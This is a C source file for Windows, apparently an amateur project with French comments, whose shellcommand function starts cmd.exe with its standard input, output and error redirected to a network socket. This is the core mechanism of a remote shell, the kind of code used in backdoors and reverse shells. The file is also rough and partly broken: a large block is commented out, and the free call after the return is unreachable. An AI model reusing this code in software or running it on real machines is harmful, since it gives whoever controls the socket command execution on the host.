#include <stdio.h>
#include <stdlib.h>
#include <string.h>


#include "shell.h"

#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
char* shellcommand(char* command, SOCKET* socket)
{
  printf("test du shell... : \n");
  FILE *fp;
  char path[1035];
  char buffer[10000];       // Buffer
  char* finalOutput = NULL; // Final result
  char currentDirectory[100];
  memset(path,0,1035);      // reset to 0 path
  memset(buffer,0,10000);  // reset to 0 buffer
  memset(currentDirectory,0,100);  // reset to 0 currentDirectory

//test de  create process
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;

    memset(&sui,0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags =(STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sui.hStdInput=sui.hStdOutput = sui.hStdError =(HANDLE)socket;

    char* cmdline = "cmd.exe";
    if(!CreateProcess(NULL, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi)){
        printf("CreateProcess failes (%d).\n", GetLastError());
    }

   /* Open the command for reading. */
 /** else{
      fp = popen(command, "r");
      if (fp == NULL) {
        printf("Failed to run command\n" );
        exit(1);
      }
      else {
        // Read the output a line at a time - output it.
        while (fgets(path, sizeof(path)-1, fp) != NULL) {
          printf("%s", path);
          strcat(buffer,path);
        }

         printf("BUFFER : \n");
         printf("%s\n", buffer);
         int size = strlen(buffer)*sizeof(char);
         printf("size of the buffer : %d\n", size);

         finalOutput = (char* )malloc((strlen(buffer))*sizeof(char) +1);
         if(finalOutput == NULL){
          printf("%s\n", "Failed to allocate memory");
          exit(0);
         }
         strcpy(finalOutput,buffer); //fais peter

     }

      // close
      pclose(fp);
    }
**/
  if (finalOutput == NULL){
    printf("%s\n", "finalOutput is NULL");
    return "NULL\n";
  }
  else{
    printf("finalOutput is not null : %s",finalOutput);
    return finalOutput;

  }
  printf("%s\n", "FREE MEMORY");
  free(finalOutput);

}
